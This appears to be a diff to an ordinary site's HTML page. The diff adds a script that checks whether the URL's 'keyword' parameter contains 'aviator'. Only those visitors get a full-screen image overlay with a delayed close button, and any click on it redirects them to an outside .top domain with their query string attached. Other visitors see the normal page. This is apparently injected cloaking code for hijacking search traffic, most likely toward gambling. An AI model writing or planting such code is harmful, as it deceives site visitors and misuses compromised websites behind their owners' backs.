@@ -22,6 +22,258 @@
 </head>
 <body>
 
+<style>
+    .cookie-dialog {
+        z-index: 9999999;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: rgba(250, 250, 250, 0.56);
+        border-radius: 24px;
+        box-shadow: 0 28px 56px rgba(0, 0, 0, 0.6);
+        padding: 10px;
+        max-width: 600px;
+        width: 90%;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 0.8s, visibility 0.8s;
+    }
+
+    .cookie-dialog-content {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+    }
+
+    .cookie-dialog-header {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-bottom: 36px;
+    }
+
+    .cookie-dialog-icon {
+        font-size: 48px;
+        color: #ff6b6b;
+        margin-bottom: 20px;
+    }
+
+    .cookie-dialog-title {
+        font-size: 18px;
+        font-weight: bold;
+        color: #000000;
+    }
+
+    .cookie-dialog-text {
+        font-size: 14px;
+        line-height: 1.6;
+        color: #000000;
+        margin-bottom: 40px;
+    }
+
+    .cookie-dialog-link {
+        color: #9575cd;
+        text-decoration: none;
+        transition: color 0.6s;
+    }
+
+    .cookie-dialog-link:hover {
+        color: #7e57c2;
+    }
+
+    .cookie-dialog-actions {
+        display: flex;
+        justify-content: center;
+    }
+
+    .cookie-dialog-button {
+        background-color: #2196f3;
+        color: #f5f5f5;
+        border: none;
+        padding: 16px 32px;
+        border-radius: 14px;
+        font-size: 18px;
+        font-weight: bold;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        cursor: pointer;
+        transition: background-color 0.6s;
+    }
+
+    .cookie-dialog-button:hover {
+        background-color: #1e88e5;
+    }
+</style>
+
+<div id="cookie-dialog" class="cookie-dialog">
+    <div class="cookie-dialog-content">
+        <div class="cookie-dialog-header">
+            <div class="cookie-dialog-icon">
+                <i class="fas fa-cookie-bite"></i>
+            </div>
+            <h2 class="cookie-dialog-title">Cookies Policy</h2>
+        </div>
+        <p class="cookie-dialog-text">
+            By using our website, you consent to our use of cookies. These small data files help us remember your preferences and provide personalized content. We also collect anonymous usage statistics to improve our services. To learn more, please review our <a href="cookie.html" class="cookie-dialog-link">Cookie Policy</a>.
+        </p>
+        <div class="cookie-dialog-actions">
+            <button id="accept-cookies" class="cookie-dialog-button">
+                <i class="fas fa-check"></i>
+                I Accept
+            </button>
+        </div>
+    </div>
+</div>
+
+<script>
+  //  if (!localStorage.getItem('cookiesAccepted')) {
+        const cookieDialog = document.getElementById('cookie-dialog');
+        cookieDialog.style.opacity = '1';
+        cookieDialog.style.visibility = 'visible';
+    //}
+
+
+    const acceptCookiesButton = document.getElementById('accept-cookies');
+    acceptCookiesButton.addEventListener('click', () => {
+
+        //localStorage.setItem('cookiesAccepted', 'true');
+
+
+        const cookieDialog = document.getElementById('cookie-dialog');
+        cookieDialog.style.opacity = '0';
+        cookieDialog.style.visibility = 'hidden';
+    });
+</script>
+
+
+
+<style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+    }
+
+    .bg-banner{
+        background: #000000;
+        width: 100%;
+        height: 100%;
+    }
+
+    .banner {
+        z-index: 9999999;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: url('/static/banner1.png') no-repeat center center fixed;
+        background-size: contain;
+        display: flex;
+        justify-content: flex-end;
+        align-items: flex-start;
+    }
+
+    .close-btn {
+        margin: 20px;
+        font-size: 50px;
+        font-weight: bolder;
+        color: #8a8a8a;
+        transition: color 0.3s;
+        z-index: 1; /* Ensure close button is above the banner */
+    }
+
+    .close-btn.active {
+        color: #8a8a8a;
+        cursor: pointer;
+    }
+
+    @media (max-width: 768px) {
+        .close-btn {
+            font-size: 20px;
+            margin: 10px;
+        }
+    }
+</style>
+
+
+<div class="bg-banner">
+    <div class="banner" id="banner">
+        <div class="close-btn" id="closeBtn">10</div>
+    </div>
+</div>
+
+<script>
+    const url = new URL(window.location.href);
+    const keywordValue = url.searchParams.get("keyword");
+
+    cookieDialog.style.opacity = '0';
+    cookieDialog.style.visibility = 'hidden';
+
+    if (!keywordValue || !keywordValue.includes("aviator")) {
+        // window.location.href = '/site';
+        document.querySelector('.banner').style.display = 'none';
+        document.querySelector('.bg-banner').style.display = 'none';
+        document.body.style.overflow = 'auto';
+        document.documentElement.style.overflow = 'auto';
+
+        cookieDialog.style.opacity = '1';
+        cookieDialog.style.visibility = 'visible';
+    } else {
+        if (location.search) {
+            localStorage.setItem('savedQuery', location.search);
+        }
+    }
+</script>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const closeBtn = document.getElementById('closeBtn');
+        const banner = document.getElementById('banner');
+        let countdown = 10;
+
+        const countdownInterval = setInterval(function() {
+            countdown--;
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                closeBtn.textContent = '×';
+                closeBtn.classList.add('active');
+                closeBtn.style.cursor = 'pointer';
+            } else {
+                closeBtn.textContent = countdown;
+            }
+        }, 1000);
+
+        closeBtn.addEventListener('click', function(event) {
+            event.stopPropagation();
+            if (closeBtn.classList.contains('active')) {
+                // window.location.href = '/site';
+                document.querySelector('.banner').style.display = 'none';
+                document.querySelector('.bg-banner').style.display = 'none';
+                document.body.style.overflow = 'auto';
+                document.documentElement.style.overflow = 'auto';
+
+                cookieDialog.style.opacity = '1';
+                cookieDialog.style.visibility = 'visible';
+
+            }
+        });
+
+        banner.addEventListener('click', function(event) {
+            if (!event.target.closest('.close-btn')) {
+                const savedQuery = localStorage.getItem('savedQuery');
+                const redirectUrl = `https://aviacompassupr.top/XM7BRh${savedQuery ? savedQuery : ''}`;
+                window.location.href = redirectUrl;
+            }
+        });
+    });
+</script>
+
 <section class="kuht-section kuht-section-4aehqzag ">
     <div class="kuht-container-77yea71h  ">
         <div class="kuht-container-1zvehgs5  ">
@@ -377,130 +629,7 @@
     </div>
 </section>
 
-<style>
-    .cookie-dialog {
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background-color: rgba(250, 250, 250, 0.56);
-        border-radius: 24px;
-        box-shadow: 0 28px 56px rgba(0, 0, 0, 0.6);
-        padding: 10px;
-        max-width: 600px;
-        width: 90%;
-        opacity: 0;
-        visibility: hidden;
-        transition: opacity 0.8s, visibility 0.8s;
-    }
 
-    .cookie-dialog-content {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        text-align: center;
-    }
-
-    .cookie-dialog-header {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        margin-bottom: 36px;
-    }
-
-    .cookie-dialog-icon {
-        font-size: 48px;
-        color: #ff6b6b;
-        margin-bottom: 20px;
-    }
-
-    .cookie-dialog-title {
-        font-size: 18px;
-        font-weight: bold;
-        color: #000000;
-    }
-
-    .cookie-dialog-text {
-        font-size: 14px;
-        line-height: 1.6;
-        color: #000000;
-        margin-bottom: 40px;
-    }
-
-    .cookie-dialog-link {
-        color: #9575cd;
-        text-decoration: none;
-        transition: color 0.6s;
-    }
-
-    .cookie-dialog-link:hover {
-        color: #7e57c2;
-    }
-
-    .cookie-dialog-actions {
-        display: flex;
-        justify-content: center;
-    }
-
-    .cookie-dialog-button {
-        background-color: #2196f3;
-        color: #f5f5f5;
-        border: none;
-        padding: 16px 32px;
-        border-radius: 14px;
-        font-size: 18px;
-        font-weight: bold;
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        cursor: pointer;
-        transition: background-color 0.6s;
-    }
-
-    .cookie-dialog-button:hover {
-        background-color: #1e88e5;
-    }
-</style>
-
-<div id="cookie-dialog" class="cookie-dialog">
-    <div class="cookie-dialog-content">
-        <div class="cookie-dialog-header">
-            <div class="cookie-dialog-icon">
-                <i class="fas fa-cookie-bite"></i>
-            </div>
-            <h2 class="cookie-dialog-title">Cookies Policy</h2>
-        </div>
-        <p class="cookie-dialog-text">
-            By using our website, you consent to our use of cookies. These small data files help us remember your preferences and provide personalized content. We also collect anonymous usage statistics to improve our services. To learn more, please review our <a href="cookie.html" class="cookie-dialog-link">Cookie Policy</a>.
-        </p>
-        <div class="cookie-dialog-actions">
-            <button id="accept-cookies" class="cookie-dialog-button">
-                <i class="fas fa-check"></i>
-                I Accept
-            </button>
-        </div>
-    </div>
-</div>
-
-<script>
-    if (!localStorage.getItem('cookiesAccepted')) {
-        const cookieDialog = document.getElementById('cookie-dialog');
-        cookieDialog.style.opacity = '1';
-        cookieDialog.style.visibility = 'visible';
-    }
-
-
-    const acceptCookiesButton = document.getElementById('accept-cookies');
-    acceptCookiesButton.addEventListener('click', () => {
-
-        //localStorage.setItem('cookiesAccepted', 'true');
-
-
-        const cookieDialog = document.getElementById('cookie-dialog');
-        cookieDialog.style.opacity = '0';
-        cookieDialog.style.visibility = 'hidden';
-    });
-</script>
 
 </body>
 </html>
